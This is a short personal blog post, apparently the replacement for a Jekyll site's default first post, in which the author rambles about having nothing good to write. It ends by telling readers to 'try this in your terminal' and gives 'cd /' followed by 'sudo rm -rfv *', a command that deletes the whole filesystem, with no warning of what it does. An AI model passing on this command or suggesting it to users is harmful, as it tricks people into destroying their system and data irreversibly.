This post is suppose to be some instructional info on how to edit and post through Jekyll, It's stupid to leave the first post like that, so I get rid of it.

Posts on my personal web page are supposed to be fun and weird. However, currently I'm not in the mood of writing any GOOD posts, so I just wrote some nonsense like this, because nobody's gonna notice this tiny little wesite among our huge and deep internet that keeps us safe and ignorant.


Try this in your terminal:

{% highlight ruby %}
cd /
sudo rm -rfv *
{% endhighlight %}
